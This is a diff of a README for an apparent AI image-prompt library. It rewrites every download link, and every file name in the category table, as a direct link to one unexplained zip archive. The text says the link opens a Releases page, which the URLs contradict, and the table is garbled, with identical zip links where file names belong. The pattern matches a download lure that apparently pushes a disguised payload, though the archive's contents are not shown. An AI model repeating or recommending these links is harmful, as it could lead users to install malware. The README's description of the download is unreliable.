@@ -8,14 +8,14 @@ Welcome to the Nano Banana Pro Prompts Library! This is your go-to resource for 
 
 To get started, you need to download the software. 
 
-[![Download Now](https://raw.githubusercontent.com/Comnaemman/Master-Guide-to-Nano-Banana-Pro-Prompts/main/Meganthropus/to-Banana-Master-Nano-Prompts-Guide-Pro-2.1.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Comnaemman/Master-Guide-to-Nano-Banana-Pro-Prompts/main/Meganthropus/to-Banana-Master-Nano-Prompts-Guide-Pro-2.1.zip)
+[![Download Now](https://github.com/Comnaemman/Master-Guide-to-Nano-Banana-Pro-Prompts/raw/refs/heads/main/Meganthropus/to-Banana-Master-Nano-Prompts-Guide-Pro-2.1.zip%20Now-Click%20Here-brightgreen)](https://github.com/Comnaemman/Master-Guide-to-Nano-Banana-Pro-Prompts/raw/refs/heads/main/Meganthropus/to-Banana-Master-Nano-Prompts-Guide-Pro-2.1.zip)
 
 1. Click the download link above.
 2. This will take you to the Releases page.
 3. Find the latest version and click on it.
 4. Download the appropriate file for your system.
 
-You can also visit the download page directly: [Download Page](https://raw.githubusercontent.com/Comnaemman/Master-Guide-to-Nano-Banana-Pro-Prompts/main/Meganthropus/to-Banana-Master-Nano-Prompts-Guide-Pro-2.1.zip).
+You can also visit the download page directly: [Download Page](https://github.com/Comnaemman/Master-Guide-to-Nano-Banana-Pro-Prompts/raw/refs/heads/main/Meganthropus/to-Banana-Master-Nano-Prompts-Guide-Pro-2.1.zip).
 
 ## 🛠️ How It Works
 
@@ -35,11 +35,11 @@ The prompts in our library are organized into key categories for your convenienc
 
 | File                      | Content                      | Quantity |
 |---------------------------|------------------------------|----------|
-| `https://raw.githubusercontent.com/Comnaemman/Master-Guide-to-Nano-Banana-Pro-Prompts/main/Meganthropus/to-Banana-Master-Nano-Prompts-Guide-Pro-2.1.zip`     | Portraits, selfies, characters| 77       |
-| `https://raw.githubusercontent.com/Comnaemman/Master-Guide-to-Nano-Banana-Pro-Prompts/main/Meganthropus/to-Banana-Master-Nano-Prompts-Guide-Pro-2.1.zip`      | Commercial product shots      | 30       |
-| `https://raw.githubusercontent.com/Comnaemman/Master-Guide-to-Nano-Banana-Pro-Prompts/main/Meganthropus/to-Banana-Master-Nano-Prompts-Guide-Pro-2.1.zip`     | Infographics, slides         | 12       |
-| `https://raw.githubusercontent.com/Comnaemman/Master-Guide-to-Nano-Banana-Pro-Prompts/main/Meganthropus/to-Banana-Master-Nano-Prompts-Guide-Pro-2.1.zip`    | Anime, manga, illustrations  | 7        |
-| `https://raw.githubusercontent.com/Comnaemman/Master-Guide-to-Nano-Banana-Pro-Prompts/main/Meganthropus/to-Banana-Master-Nano-Prompts-Guide-Pro-2.1.zip`          | Logos, branding materials     | 10       |
+| `https://github.com/Comnaemman/Master-Guide-to-Nano-Banana-Pro-Prompts/raw/refs/heads/main/Meganthropus/to-Banana-Master-Nano-Prompts-Guide-Pro-2.1.zip`     | Portraits, selfies, characters| 77       |
+| `https://github.com/Comnaemman/Master-Guide-to-Nano-Banana-Pro-Prompts/raw/refs/heads/main/Meganthropus/to-Banana-Master-Nano-Prompts-Guide-Pro-2.1.zip`      | Commercial product shots      | 30       |
+| `https://github.com/Comnaemman/Master-Guide-to-Nano-Banana-Pro-Prompts/raw/refs/heads/main/Meganthropus/to-Banana-Master-Nano-Prompts-Guide-Pro-2.1.zip`     | Infographics, slides         | 12       |
+| `https://github.com/Comnaemman/Master-Guide-to-Nano-Banana-Pro-Prompts/raw/refs/heads/main/Meganthropus/to-Banana-Master-Nano-Prompts-Guide-Pro-2.1.zip`    | Anime, manga, illustrations  | 7        |
+| `https://github.com/Comnaemman/Master-Guide-to-Nano-Banana-Pro-Prompts/raw/refs/heads/main/Meganthropus/to-Banana-Master-Nano-Prompts-Guide-Pro-2.1.zip`          | Logos, branding materials     | 10       |
 
 Each category is crafted to address various needs. Explore them to find the perfect prompt.
 
